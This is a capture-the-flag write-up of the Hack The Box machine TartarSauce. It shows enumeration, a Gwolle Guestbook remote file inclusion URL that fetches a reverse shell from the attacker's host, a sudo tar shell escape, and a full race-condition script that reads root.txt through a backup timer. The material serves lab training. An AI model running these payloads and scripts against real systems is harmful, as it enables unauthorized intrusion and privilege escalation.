# TARTARSAUCE

## NMAP

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/tartarsauce]
└─$ nmap 10.10.10.88
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-21 10:17 EDT
Nmap scan report for 10.10.10.88
Host is up (0.27s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http

┌──(kali㉿kali)-[~/Downloads/hackthebox/tartarsauce]
└─$ nmap 10.10.10.88 -p 80 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-21 10:17 EDT
Nmap scan report for 10.10.10.88
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing Page

```

## WEBSITE

![](https://github.com/Leo-2807/Writeups/blob/main/images/tartarsauce1.png)

We can see in the nmap scan that there is a `/robots.txt` available.

### ROBOTS.TXT

![](https://github.com/Leo-2807/Writeups/blob/main/images/tartarsauce2.png)

So out of the five files that are disallowed only one is accessible to us , the others give a 404 error

## MONSTRA

![](https://github.com/Leo-2807/Writeups/blob/main/images/tartarsauce3.png)

### LOGIN

![](https://github.com/Leo-2807/Writeups/blob/main/images/tartarsauce4.png)

Since we did not find any creds while looking through the website why not try to look for default creds. 

On googling a bit I found this [article](https://simpleinfosec.com/2018/05/27/monstra-cms-3-0-4-unauthenticated-user-credential-exposure/) which says that this version of monstra have all the users and their password hashes saved in a file which is publically avaible to any unauthenticated user.

![](https://github.com/Leo-2807/Writeups/blob/main/images/tartarsauce5.png)

I tried to use this password and crack it if it was encoded but it did not lead anywhere and it's just a rabbit hole

## WORDPRESS

Running `GOBUSTER` scan on `/webservices` directory we find a wordpress site

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/tartarsauce]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.88/webservices  -q -t 100 -x php,html,txt,phtml
/wp                   (Status: 301) [Size: 319] [--> http://10.10.10.88/webservices/wp/]
```

![](https://github.com/Leo-2807/Writeups/blob/main/images/tartarsauce6.png)

### WPSCAN

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/tartarsauce]
└─$ wpscan --url http://10.10.10.88/webservices/wp -e at -e ap -e u

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.10.88/webservices/wp/ [10.10.10.88]
[+] Started: Tue Sep 21 12:06:56 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.10.88/webservices/wp/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.10.88/webservices/wp/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.10.88/webservices/wp/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.4'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/, Match: 'WordPress 4.9.4'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <=========> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] wpadmin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

With this scan we get a version for which we might be able to find a exploit.
We also found a user `wpadmin`
On searching for exploits , only authenticated exploits can be found. So , I tried to find the password for the user `wpadmin` but I couldn't . 
I thought maybe this was another rabbit hole and we are back to square one.
So I remembered that on a previous box having worpress had a vulnerable plugin but on this one wpscan didn't find any.
Maybe there is plugin which wpscan cannot find with `passive methods`.

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/tartarsauce]
└─$ wpscan --url http://10.10.10.88/webservices/wp -e ap --plugins-detection-aggressive
...snip...
[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 01:42:06 <> (95088 / 95088) 100.00% Time: 01:42:06
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/
 | Last Updated: 2021-09-03T16:53:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 4.1.12
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt

[+] brute-force-login-protection
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/
 | Latest Version: 1.5.3 (up to date)
 | Last Updated: 2017-06-29T10:39:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/, status: 403
 |
 | Version: 1.5.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt

[+] gwolle-gb
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
 | Last Updated: 2021-09-14T09:01:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | [!] The version is out of date, the latest version is 4.1.2
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200
 |
 | Version: 2.3.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
```

On reading through readme.txt for all the plugins something interesting can be found at `http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt`

![](https://github.com/Leo-2807/Writeups/blob/main/images/tartarsauce8.png)

This means that `gwolle-gb 1.5.3` is the one running on this machine .

## EXPLOIT

This [exploit](http://www.exploit-db.com/exploits/38861) can be found on exploit-db

```
Advisory Details:

High-Tech Bridge Security Research Lab discovered a critical Remote File Inclusion (RFI) in Gwolle Guestbook WordPress plugin, which can be exploited by non-authenticated attacker to include remote PHP file and execute arbitrary code on the vulnerable system.  

HTTP GET parameter "abspath" is not being properly sanitized before being used in PHP require() function. A remote attacker can include a file named 'wp-load.php' from arbitrary remote server and execute its content on the vulnerable web server. In order to do so the attacker needs to place a malicious 'wp-load.php' file into his server document root and includes server's URL into request:

http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]

In order to exploit this vulnerability 'allow_url_include' shall be set to 1. Otherwise, attacker may still include local files and also execute arbitrary code. 

Successful exploitation of this vulnerability will lead to entire WordPress installation compromise, and may even lead to the entire web server compromise.
```

Following the exploit I renamed php-reverse-shell to `wp-load.php` and started a `python -m SimpleHTTPServer` and a nc listener on my machine.

Then I navigated to the url `http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.8:8000/`

and I got a shell

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/tartarsauce]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.88] 35580
Linux TartarSauce 4.15.0-041500-generic #201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 athlon i686 GNU/Linux
 12:56:35 up  2:27,  0 users,  load average: 0.05, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@TartarSauce:/$
```

## USER.TXT

Using `sudo -l` to check for sudo permissions

```bash
www-data@TartarSauce:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

After a little search I found a way to become user `onuma` with the help of `bin/tar`

```bash
www-data@TartarSauce:/bin$ sudo -u onuma /bin/tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
h <&2 1>&2"'a /bin/tar xf /dev/null -I '/bin/sh -c "s 
$ id
id
uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
onuma@TartarSauce:/bin$
```

## ROOT.TXT

I tried to do some manual enumeration but nothing stood out to me. 
We can use a privesec enumeration script so we do exactly that .
I ran `LinEnum.sh` and there was something that was kind of sus.

```bash
[-] Systemd timers:
NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES
Wed 2021-09-22 06:28:04 EDT  2min 20s left Wed 2021-09-22 06:23:04 EDT  2min 39s ago backuperer.timer             backuperer.service
Wed 2021-09-22 17:14:08 EDT  10h left      Wed 2021-09-22 05:52:51 EDT  32min ago    apt-daily.timer              apt-daily.service
Thu 2021-09-23 06:07:54 EDT  23h left      Wed 2021-09-22 06:07:54 EDT  17min ago    systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Thu 2021-09-23 06:30:09 EDT  24h left      Wed 2021-09-22 06:04:17 EDT  21min ago    apt-daily-upgrade.timer      apt-daily-upgrade.service

4 timers listed.
Enable thorough tests to see inactive timers
```
On searching a bit a find that `systemd timer` is just like cronjobs runs file as root.
`backuperer.service` is being run byt it every 5 minutes.
Maybe we should look into this.

```bash
onuma@TartarSauce:/usr/sbin$ cat backuperer
cat backuperer
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```

This script makes archive then sleeps for 30 sec , extracts the archive in a new location and checks the diference between the archive and the basefile.
So what we can do is during the 30 sec sleep we can change the archive and place the link of root.txt instead of robots.txt make the archive and leave it. So when the script extracts our archive the diff command would observe the changes and save them in /var/backups/onuma_backup_error.txt

I did this using a n amzing script by 0xdf

```bash
#!/bin/bash

# work out of shm
cd /dev/shm

# set both start and cur equal to any backup file if it's there
start=$(find /var/tmp -maxdepth 1 -type f -name ".*")
cur=$(find /var/tmp -maxdepth 1 -type f -name ".*")

# loop until there's a change in cur
echo "Waiting for archive filename to change..."
while [ "$start" == "$cur" -o "$cur" == "" ] ; do
    sleep 10;
    cur=$(find /var/tmp -maxdepth 1 -type f -name ".*");
done

# Grab a copy of the archive
echo "File changed... copying here"
cp $cur .

# get filename
fn=$(echo $cur | cut -d'/' -f4)

# extract archive
tar -zxf $fn

# remove robots.txt and replace it with link to root.txt
rm var/www/html/robots.txt
ln -s /root/root.txt var/www/html/robots.txt

# remove old archive
rm $fn

# create new archive
tar czf $fn var

# put it back, and clean up
mv $fn $cur
rm $fn
rm -rf var

# wait for results
echo "Waiting for new logs..."
tail -f /var/backups/onuma_backup_error.txt
```

Running this script gave me the root.txt

```bash
onuma@TartarSauce:/dev/shm$ ./root.sh
./root.sh
Waiting for archive filename to change...
File changed... copying here
tar: var/www/html/webservices/monstra-3.0.4/public/uploads/.empty: Cannot stat: Permission denied
tar: Exiting with failure status due to previous errors
rm: cannot remove '.6c7dc6e795213cc73a9172c4e13008c1ff2fe0c8': No such file or directory
rm: cannot remove 'var/www/html/webservices/monstra-3.0.4/public/uploads/.empty': Permission denied
Waiting for new logs...
---
>                                                       if (preg_match('#\
\ No newline at end of file
Only in /var/www/html/webservices/wp/wp-includes: js
Only in /var/www/html/webservices/wp/wp-includes: nav-menu-template.php
Only in /var/www/html/webservices/wp/wp-includes: shortcodes.php
Only in /var/www/html/webservices/wp/wp-includes: theme.php
Only in /var/www/html/webservices/wp: wp-load.php
Only in /var/www/html/webservices/wp: wp-login.php
Only in /var/www/html/webservices/wp: wp-settings.php
------------------------------------------------------------------------
Integrity Check Error in backup last ran :  Wed Sep 22 07:29:09 EDT 2021
------------------------------------------------------------------------
/var/tmp/.6c7dc6e795213cc73a9172c4e13008c1ff2fe0c8
diff -r /var/www/html/robots.txt /var/tmp/check/var/www/html/robots.txt
1,7c1
< User-agent: *
< Disallow: /webservices/tar/tar/source/
< Disallow: /webservices/monstra-3.0.4/
< Disallow: /webservices/easy-file-uploader/
< Disallow: /webservices/developmental/
< Disallow: /webservices/phpmyadmin/
< 
---
> e79abdab8b8a4b64f8579a10b2cd09f9
```
